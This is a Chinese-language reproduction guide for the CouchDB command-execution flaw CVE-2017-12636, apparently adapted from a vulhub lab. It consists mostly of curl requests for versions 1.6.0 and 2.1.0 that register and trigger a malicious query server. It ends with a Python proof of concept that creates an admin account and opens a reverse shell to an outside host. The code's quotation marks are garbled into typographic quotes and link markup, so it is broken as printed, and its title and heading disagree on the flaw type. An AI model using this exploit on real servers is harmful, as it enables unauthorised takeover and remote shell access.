---
title: （CVE-2017-12636）Couchdb 垂直权限绕过漏洞
id: zhfly2857
---

# （CVE-2017-12636）Couchdb 任意命令执行漏洞

## 一、漏洞简介

在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置`query_server`，这个配置项在设计、执行view的时候将被运行。

## 二、漏洞影响

小于 1.7.0 以及 小于 2.1.1

## 三、复现过程

### 环境搭建

Couchdb 2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是1.6.0版本，如果你想测试2.1.0版本，可以启动[CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635)附带的环境。

执行如下命令启动Couchdb 1.6.0环境：

```
docker-compose up -d 
```

启动完成后，访问`http://www.0-sec.org:5984/`即可看到Couchdb的欢迎页面。

### 漏洞复现

该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用**CVE-2017-12635**先增加一个管理员用户。

#### 1.6.0 下的说明

依次执行如下请求即可触发任意命令执行：

```
curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'
curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://vulhub:vulhub@www.0-sec.org:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json' 
```

其中,`vulhub:vulhub`为管理员账号密码。

第一个请求是添加一个名字为`cmd`的`query_servers`，其值为`"id >/tmp/success"`，这就是我们后面待执行的命令。

第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。

第四个请求就是在这个Database里进行查询，因为我将language设置为`cmd`，这里就会用到我第一步里添加的名为`cmd`的`query_servers`，最后触发命令执行。

#### 2.1.0 下的说明

2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。

Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问`/_membership`即可：

```
curl http://vulhub:vulhub@www.0-sec.org:5984/_membership 
```

![image](../img/74ca4199e94d58ba860c1ec639f01f6f.png)

可见，我们这里只有一个node，名字是`nonode@nohost`。

然后，我们修改`nonode@nohost`的配置：

```
curl -X PUT http://vulhub:vulhub@www.0-sec.org:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/success"' 
```

![image](../img/cc0412777848ce0cd53eeceb72f49858.png)

然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：

```
curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@www.0-sec.org:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}' 
```

Couchdb 2.x删除了`_temp_view`，所以我们为了触发`query_servers`中定义的命令，需要添加一个`_view`：

```
curl -X PUT http://vulhub:vulhub@www.0-sec.org:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json" 
```

增加`_view`的同时即触发了`query_servers`中的命令。

### poc

> 修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），成功反弹shell：

![image](../img/63fcb2c996c163745af12800595758df.png)

```
#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = ‘[http://your-ip:5984](http://your-ip:5984)’

command = rb""“sh -i >& /dev/tcp/10.0.0.1/443 0>&1"”"

version = 1

session = requests.session()

session.headers = {

‘Content-Type’: ‘application/json’

}

# session.proxies = {

# ‘http’: ‘[http://127.0.0.1:8085](http://127.0.0.1:8085)’

# }

session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{

“type”: “user”,

“name”: “wooyun”,

“roles”: ["_admin"],

“roles”: [],

“password”: “wooyun”

}’’’)

session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)

command = “bash -c ‘{echo,%s}|{base64,-d}|{bash,-i}’” % base64.b64encode(command).decode()

if version == 1:

session.put(target + (’/_config/query_servers/cmd’), data=json.dumps(command))

else:

host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]

session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=json.dumps(command))

session.put(target + ‘/wooyun’)

session.put(target + ‘/wooyun/test’, data=’{"_id": “wooyuntest”}’) `if version == 1:

session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:“cmd”,“map”:""}’)

else:

session.put(target + ‘/wooyun/_design/test’, data=’{"_id":"_design/test",“views”:{“wooyun”:{“map”:""} },“language”:“cmd”}’)` 
```

## 参考链接

> https://vulhub.org/#/environments/couchdb/CVE-2017-12636/